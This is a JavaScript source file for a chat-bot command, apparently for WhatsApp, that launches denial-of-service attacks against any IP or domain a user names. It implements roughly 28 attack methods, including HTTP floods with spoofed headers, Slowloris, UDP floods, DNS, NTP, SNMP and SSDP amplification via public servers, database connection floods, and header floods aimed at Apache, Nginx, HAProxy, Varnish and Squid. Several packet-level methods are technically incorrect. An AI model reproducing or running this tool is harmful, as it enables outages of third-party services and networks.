const axios = require('axios');
const dgram = require('dgram');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const dns = require('dns');

class VCrashCommand {
    constructor() {
        this.name = 'vcrash';
        this.description = 'Execute advanced crash attacks on targets';
        this.category = 'exploit';
        this.activeAttacks = new Map();
        this.attackMethods = {
            'http': this.httpFlood.bind(this),
            'syn': this.synFlood.bind(this),
            'slow': this.slowloris.bind(this),
            'udp': this.udpFlood.bind(this),
            'dns': this.dnsAmplification.bind(this),
            'tls': this.tlsReaper.bind(this),
            'http2': this.http2Flood.bind(this),
            'ws': this.websocketFlood.bind(this),
            'mysql': this.mysqlCrash.bind(this),
            'postgres': this.postgresCrash.bind(this),
            'redis': this.redisFlood.bind(this),
            'memcached': this.memcachedCrash.bind(this),
            'ntp': this.ntpAmplification.bind(this),
            'snmp': this.snmpAmplification.bind(this),
            'ssdp': this.ssdpAmplification.bind(this),
            'chargen': this.chargenFlood.bind(this),
            'smurf': this.smurfAttack.bind(this),
            'fraggle': this.fraggleAttack.bind(this),
            'land': this.landAttack.bind(this),
            'teardrop': this.teardropAttack.bind(this),
            'ping_death': this.pingOfDeath.bind(this),
            'slow_read': this.slowReadAttack.bind(this),
            'r_u_dead': this.rUDeadAttack.bind(this),
            'apache_killer': this.apacheKiller.bind(this),
            'nginx_killer': this.nginxKiller.bind(this),
            'haproxy_killer': this.haproxyKiller.bind(this),
            'varnish_killer': this.varnishKiller.bind(this),
            'squid_killer': this.squidKiller.bind(this)
        };
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: `⚡ V-CRASH USAGE ⚡
┌─────────────────────────────
│ .vcrash <target> [method] [duration]
│ 
│ METHODS:
│ http, syn, slow, udp, dns, tls
│ http2, ws, mysql, postgres, redis
│ memcached, ntp, snmp, ssdp, chargen
│ smurf, fraggle, land, teardrop
│ ping_death, slow_read, r_u_dead
│ apache_killer, nginx_killer, haproxy_killer
│ varnish_killer, squid_killer
│
│ EXAMPLE:
│ .vcrash 192.168.1.1 http 30
└─────────────────────────────`
            }, { quoted: msg });
            return;
        }

        const target = args[0];
        const method = args[1] || 'random';
        const duration = parseInt(args[2]) || 30;
        const attackId = `vcrash_${Date.now()}`;

        if (!this.isValidTarget(target)) {
            await sock.sendMessage(ctx.from, {
                text: `❌ Invalid target: ${target}\nTarget must be IP or domain`
            }, { quoted: msg });
            return;
        }

        if (this.activeAttacks.has(target)) {
            await sock.sendMessage(ctx.from, {
                text: `⚠️ Attack already running on ${target}\nUse .vcrash_stop ${target} to stop`
            }, { quoted: msg });
            return;
        }

        this.activeAttacks.set(target, { attackId, startTime: Date.now() });

        await sock.sendMessage(ctx.from, {
            text: `🔥 V-CRASH INITIATED 🔥
┌─────────────────────────────
│ Target: ${target}
│ Method: ${method}
│ Duration: ${duration}s
│ Attack ID: ${attackId}
└─────────────────────────────`
        }, { quoted: msg });

        try {
            const result = await this.executeAttack(target, method, duration, attackId);
            
            await sock.sendMessage(ctx.from, {
                text: `💀 V-CRASH COMPLETE 💀
┌─────────────────────────────
│ Target: ${target}
│ Method: ${method}
│ Status: ${result.status}
│ Packets Sent: ${result.packets || 'N/A'}
│ Connections: ${result.connections || 'N/A'}
│ Duration: ${duration}s
└─────────────────────────────
${result.details || ''}`
            }, { quoted: msg });

        } catch (err) {
            await sock.sendMessage(ctx.from, {
                text: `❌ V-CRASH ERROR ❌
┌─────────────────────────────
│ Target: ${target}
│ Method: ${method}
│ Error: ${err.message}
└─────────────────────────────`
            }, { quoted: msg });
        } finally {
            this.activeAttacks.delete(target);
        }
    }

    isValidTarget(target) {
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
        return ipRegex.test(target) || domainRegex.test(target);
    }

    async executeAttack(target, method, duration, attackId) {
        let result = { status: 'COMPLETED', details: '' };

        if (method === 'random') {
            const methods = Object.keys(this.attackMethods);
            const randomMethod = methods[Math.floor(Math.random() * methods.length)];
            return await this.attackMethods[randomMethod](target, duration, attackId);
        }

        if (this.attackMethods[method]) {
            result = await this.attackMethods[method](target, duration, attackId);
        } else {
            throw new Error(`Unknown method: ${method}`);
        }

        return result;
    }

    async resolveTarget(target) {
        return new Promise((resolve) => {
            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(target)) {
                resolve(target);
            } else {
                dns.lookup(target, (err, address) => {
                    resolve(err ? target : address);
                });
            }
        });
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ==============================================
    // ATTACK METHODS
    // ==============================================

    async httpFlood(target, duration, attackId) {
        const urls = [
            `http://${target}/`,
            `http://${target}/index.php`,
            `http://${target}/wp-admin/`,
            `http://${target}/api/v1/`,
            `http://${target}/login`,
            `http://${target}/dashboard`,
            `http://${target}/admin`,
            `http://${target}/cgi-bin/`,
            `http://${target}/xmlrpc.php`,
            `http://${target}/wp-login.php`
        ];

        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:93.0) Gecko/93.0 Firefox/93.0',
            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ];

        let requests = 0;
        const startTime = Date.now();

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            const promises = [];
            for (let i = 0; i < 100; i++) {
                const url = urls[Math.floor(Math.random() * urls.length)];
                const headers = {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': '1',
                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                };

                promises.push(
                    axios.get(url, { 
                        headers, 
                        timeout: 1000,
                        httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false })
                    }).catch(() => {})
                );
            }
            await Promise.allSettled(promises);
            requests += promises.length;
        };

        const attackLoop = setInterval(flood, 50);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `HTTP Flood - ${requests} requests sent`
        };
    }

    async synFlood(target, duration, attackId) {
        const ports = [80, 443, 8080, 8443, 21, 22, 23, 25, 53, 110, 143, 993, 995, 3306, 5432];
        const ip = await this.resolveTarget(target);
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const sock = new net.Socket();
            const port = ports[Math.floor(Math.random() * ports.length)];
            
            sock.connect(port, ip, () => {
                const synPacket = Buffer.from([
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ]);
                sock.write(synPacket);
                packets++;
                sock.destroy();
            });
            
            sock.setTimeout(50, () => sock.destroy());
            sock.on('error', () => {});
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `SYN Flood - ${packets} SYN packets sent`
        };
    }

    async slowloris(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const connections = [];

        const createConnection = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const sock = new net.Socket();
            sock.connect(80, ip, () => {
                sock.write('GET / HTTP/1.1\r\n');
                sock.write(`Host: ${target}\r\n`);
                sock.write('User-Agent: Mozilla/5.0\r\n');
                sock.write('Accept: */*\r\n');
                
                const keepAlive = setInterval(() => {
                    try {
                        if (!this.activeAttacks.has(target)) {
                            clearInterval(keepAlive);
                            sock.destroy();
                            return;
                        }
                        sock.write('X-a: ' + crypto.randomBytes(8).toString('hex') + '\r\n');
                    } catch (e) {
                        clearInterval(keepAlive);
                    }
                }, 3000);

                connections.push({ sock, keepAlive });
            });

            sock.setTimeout(5000, () => {
                sock.destroy();
            });
            sock.on('error', () => {});
        };

        for (let i = 0; i < 3000; i++) {
            if (!this.activeAttacks.has(target)) break;
            createConnection();
            await this.sleep(5);
        }

        await this.sleep(duration * 1000);

        connections.forEach(({ sock, keepAlive }) => {
            clearInterval(keepAlive);
            sock.destroy();
        });

        return {
            status: 'COMPLETED',
            connections: connections.length,
            details: `Slowloris - ${connections.length} connections held`
        };
    }

    async udpFlood(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const port = Math.floor(Math.random() * 65535) + 1;
            const size = Math.floor(Math.random() * 1400) + 64;
            const data = crypto.randomBytes(size);
            
            sock.send(data, port, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `UDP Flood - ${packets} UDP packets sent`
        };
    }

    async dnsAmplification(target, duration, attackId) {
        const dnsServers = [
            '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222',
            '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
            '4.2.2.1', '4.2.2.2', '4.2.2.3', '4.2.2.4'
        ];

        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const dns = dnsServers[Math.floor(Math.random() * dnsServers.length)];
            const query = this.buildDNSQuery(target);
            
            sock.send(query, 53, dns, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `DNS Amplification - ${packets} queries sent`
        };
    }

    buildDNSQuery(target) {
        const query = Buffer.alloc(512);
        query.writeUInt16BE(0xAAAA, 0);
        query.writeUInt16BE(0x0100, 2);
        query.writeUInt16BE(0x0001, 4);
        query.writeUInt16BE(0x0000, 6);
        query.writeUInt16BE(0x0000, 8);
        query.writeUInt16BE(0x0000, 10);
        
        const parts = target.split('.');
        let offset = 12;
        for (const part of parts) {
            query.writeUInt8(part.length, offset);
            offset++;
            for (let i = 0; i < part.length; i++) {
                query.writeUInt8(part.charCodeAt(i), offset);
                offset++;
            }
        }
        query.writeUInt8(0x00, offset);
        offset++;
        
        query.writeUInt16BE(0x00FF, offset);
        offset += 2;
        query.writeUInt16BE(0x0001, offset);
        
        return query.subarray(0, offset + 2);
    }

    async tlsReaper(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let connections = 0;

        const createTLS = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const options = {
                host: ip,
                port: 443,
                rejectUnauthorized: false,
                secureProtocol: 'TLSv1_2_method',
                ciphers: 'ALL:!aNULL:!eNULL:!LOW:!EXPORT:!SSLv2'
            };

            const socket = tls.connect(options, () => {
                connections++;
                const malformed = Buffer.from([
                    0x16, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ]);
                socket.write(malformed);
            });

            socket.setTimeout(1000, () => socket.destroy());
            socket.on('error', () => {});
        };

        const attackLoop = setInterval(createTLS, 10);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            connections: connections,
            details: `TLS Reaper - ${connections} TLS connections established`
        };
    }

    async http2Flood(target, duration, attackId) {
        const http2 = require('http2');
        const client = http2.connect(`https://${target}`);
        let requests = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const req = client.request({
                ':path': '/',
                ':method': 'GET',
                'user-agent': 'Mozilla/5.0'
            });
            req.on('response', () => {});
            req.on('end', () => {});
            req.end();
            requests++;
        };

        const attackLoop = setInterval(flood, 10);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);
        client.close();

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `HTTP/2 Flood - ${requests} requests sent`
        };
    }

    async websocketFlood(target, duration, attackId) {
        const WebSocket = require('ws');
        let connections = 0;

        const createWS = () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const ws = new WebSocket(`ws://${target}/ws`);
                ws.on('open', () => {
                    connections++;
                    // Send random payloads
                    setInterval(() => {
                        if (!this.activeAttacks.has(target)) {
                            ws.close();
                            return;
                        }
                        ws.send(crypto.randomBytes(1024).toString('hex'));
                    }, 100);
                });
                ws.on('error', () => {});
            } catch(e) {}
        };

        for (let i = 0; i < 500; i++) {
            if (!this.activeAttacks.has(target)) break;
            createWS();
            await this.sleep(10);
        }

        await this.sleep(duration * 1000);

        return {
            status: 'COMPLETED',
            connections: connections,
            details: `WebSocket Flood - ${connections} connections established`
        };
    }

    async mysqlCrash(target, duration, attackId) {
        const mysql = require('mysql2/promise');
        let attempts = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const conn = await mysql.createConnection({
                    host: target,
                    user: 'admin',
                    password: crypto.randomBytes(16).toString('hex'),
                    database: 'mysql',
                    connectTimeout: 1000
                });
                await conn.query('SELECT 1');
                await conn.end();
                attempts++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 10);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            connections: attempts,
            details: `MySQL Crash - ${attempts} connection attempts`
        };
    }

    async postgresCrash(target, duration, attackId) {
        const { Client } = require('pg');
        let attempts = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const client = new Client({
                    host: target,
                    user: 'postgres',
                    password: crypto.randomBytes(16).toString('hex'),
                    database: 'postgres',
                    port: 5432,
                    connectionTimeoutMillis: 1000
                });
                await client.connect();
                await client.query('SELECT 1');
                await client.end();
                attempts++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 10);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            connections: attempts,
            details: `PostgreSQL Crash - ${attempts} connection attempts`
        };
    }

    async redisFlood(target, duration, attackId) {
        const Redis = require('ioredis');
        let connections = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const redis = new Redis({
                    host: target,
                    port: 6379,
                    connectTimeout: 1000
                });
                redis.ping().catch(() => {});
                redis.quit();
                connections++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 5);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            connections: connections,
            details: `Redis Flood - ${connections} connection attempts`
        };
    }

    async memcachedCrash(target, duration, attackId) {
        const memjs = require('memjs');
        let requests = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const client = memjs.Client.create(`${target}:11211`);
                client.set('key_' + crypto.randomBytes(4).toString('hex'), crypto.randomBytes(1024).toString('hex'), {});
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 5);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `Memcached Crash - ${requests} requests sent`
        };
    }

    async ntpAmplification(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const ntpQuery = Buffer.from([
                0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]);
            
            sock.send(ntpQuery, 123, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `NTP Amplification - ${packets} queries sent`
        };
    }

    async snmpAmplification(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            // SNMP GetBulk query for amplification
            const snmpQuery = Buffer.from([
                0x30, 0x3c, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70,
                0x75, 0x62, 0x6c, 0x69, 0x63, 0xa5, 0x2f, 0x02,
                0x01, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
                0x30, 0x24, 0x30, 0x0f, 0x06, 0x09, 0x2b, 0x06,
                0x01, 0x02, 0x01, 0x01, 0x02, 0x01, 0x00, 0x05,
                0x00, 0x30, 0x11, 0x06, 0x0b, 0x2b, 0x06, 0x01,
                0x02, 0x01, 0x01, 0x03, 0x01, 0x01, 0x00, 0x00,
                0x05, 0x00
            ]);
            
            sock.send(snmpQuery, 161, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `SNMP Amplification - ${packets} queries sent`
        };
    }

    async ssdpAmplification(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const ssdpQuery = `M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n`;
            
            sock.send(ssdpQuery, 1900, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `SSDP Amplification - ${packets} queries sent`
        };
    }

    async chargenFlood(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const data = crypto.randomBytes(1024);
            sock.send(data, 19, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `Chargen Flood - ${packets} packets sent`
        };
    }

    async smurfAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;
        const broadcastAddr = ip.replace(/\d+$/, '255');

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const icmpPacket = Buffer.from([
                0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]);
            
            sock.send(icmpPacket, 7, broadcastAddr, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `Smurf Attack - ${packets} ICMP packets sent`
        };
    }

    async fraggleAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;
        const broadcastAddr = ip.replace(/\d+$/, '255');

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const data = crypto.randomBytes(1024);
            sock.send(data, 7, broadcastAddr, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `Fraggle Attack - ${packets} UDP packets sent`
        };
    }

    async landAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const sock = new net.Socket();
            sock.connect(80, ip, () => {
                const packet = Buffer.from([
                    0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00,
                    0x40, 0x06, 0x00, 0x00, 0x7f, 0x00, 0x00, 0x01,
                    0x7f, 0x00, 0x00, 0x01
                ]);
                sock.write(packet);
                packets++;
                sock.destroy();
            });
            sock.setTimeout(50, () => sock.destroy());
            sock.on('error', () => {});
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `LAND Attack - ${packets} packets sent`
        };
    }

    async teardropAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const sock = new net.Socket();
            sock.connect(80, ip, () => {
                const packet = Buffer.from([
                    0x45, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x00,
                    0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                ]);
                sock.write(packet);
                packets++;
                sock.destroy();
            });
            sock.setTimeout(50, () => sock.destroy());
            sock.on('error', () => {});
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `Teardrop Attack - ${packets} packets sent`
        };
    }

    async pingOfDeath(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const data = crypto.randomBytes(65507);
            sock.send(data, 1, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 10);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `Ping of Death - ${packets} oversized packets sent`
        };
    }

    async slowReadAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const connections = [];

        const createConnection = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const sock = new net.Socket();
            sock.connect(80, ip, () => {
                sock.write('GET / HTTP/1.1\r\n');
                sock.write(`Host: ${target}\r\n`);
                sock.write('Connection: keep-alive\r\n\r\n');
                
                // Read slowly - 1 byte at a time
                sock.on('data', (data) => {
                    // Consume data slowly
                });
                
                connections.push(sock);
            });
            sock.on('error', () => {});
        };

        for (let i = 0; i < 500; i++) {
            if (!this.activeAttacks.has(target)) break;
            createConnection();
            await this.sleep(10);
        }

        await this.sleep(duration * 1000);

        connections.forEach(sock => sock.destroy());

        return {
            status: 'COMPLETED',
            connections: connections.length,
            details: `Slow Read Attack - ${connections.length} slow connections`
        };
    }

    async rUDeadAttack(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        const sock = dgram.createSocket('udp4');
        let packets = 0;

        const flood = () => {
            if (!this.activeAttacks.has(target)) return;
            
            const port = Math.floor(Math.random() * 65535) + 1;
            const data = Buffer.from('R.U.D.E.D');
            sock.send(data, port, ip, (err) => {
                if (!err) packets++;
            });
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        sock.close();

        return {
            status: 'COMPLETED',
            packets: packets,
            details: `R.U.Dead Attack - ${packets} packets sent`
        };
    }

    async apacheKiller(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let requests = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const response = await axios.get(`http://${target}/?${crypto.randomBytes(1024).toString('hex')}=${crypto.randomBytes(1024).toString('hex')}`, {
                    headers: {
                        'Range': 'bytes=0-0',
                        'If-Range': crypto.randomBytes(1024).toString('hex')
                    },
                    timeout: 1000
                });
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `Apache Killer - ${requests} requests sent`
        };
    }

    async nginxKiller(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let requests = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const response = await axios.get(`http://${target}/`, {
                    headers: {
                        'Range': 'bytes=0-18446744073709551615',
                        'If-Range': crypto.randomBytes(1024).toString('hex')
                    },
                    timeout: 1000
                });
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `Nginx Killer - ${requests} requests sent`
        };
    }

    async haproxyKiller(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let requests = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const response = await axios.get(`http://${target}/`, {
                    headers: {
                        'Connection': 'close, TE',
                        'TE': 'trailers, deflate, gzip',
                        'Transfer-Encoding': 'chunked'
                    },
                    timeout: 1000
                });
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `HAProxy Killer - ${requests} requests sent`
        };
    }

    async varnishKiller(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let requests = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const response = await axios.get(`http://${target}/`, {
                    headers: {
                        'X-Forwarded-For': crypto.randomBytes(1024).toString('hex'),
                        'X-Varnish': crypto.randomBytes(1024).toString('hex')
                    },
                    timeout: 1000
                });
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `Varnish Killer - ${requests} requests sent`
        };
    }

    async squidKiller(target, duration, attackId) {
        const ip = await this.resolveTarget(target);
        let requests = 0;

        const flood = async () => {
            if (!this.activeAttacks.has(target)) return;
            
            try {
                const response = await axios.get(`http://${target}/`, {
                    headers: {
                        'Proxy-Connection': 'keep-alive',
                        'Via': crypto.randomBytes(1024).toString('hex')
                    },
                    timeout: 1000
                });
                requests++;
            } catch(e) {}
        };

        const attackLoop = setInterval(flood, 1);
        await this.sleep(duration * 1000);
        clearInterval(attackLoop);

        return {
            status: 'COMPLETED',
            packets: requests,
            details: `Squid Killer - ${requests} requests sent`
        };
    }
}

class VCrashStopCommand {
    constructor(vcrash) {
        this.name = 'vcrash_stop';
        this.description = 'Stop running V-Crash attacks';
        this.vcrash = vcrash;
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: 'Usage: .vcrash_stop <target>'
            }, { quoted: msg });
            return;
        }

        const target = args[0];
        if (this.vcrash.activeAttacks.has(target)) {
            this.vcrash.activeAttacks.delete(target);
            await sock.sendMessage(ctx.from, {
                text: `✅ Stopped attack on ${target}`
            }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, {
                text: `❌ No active attack on ${target}`
            }, { quoted: msg });
        }
    }
}

module.exports = { VCrashCommand, VCrashStopCommand };
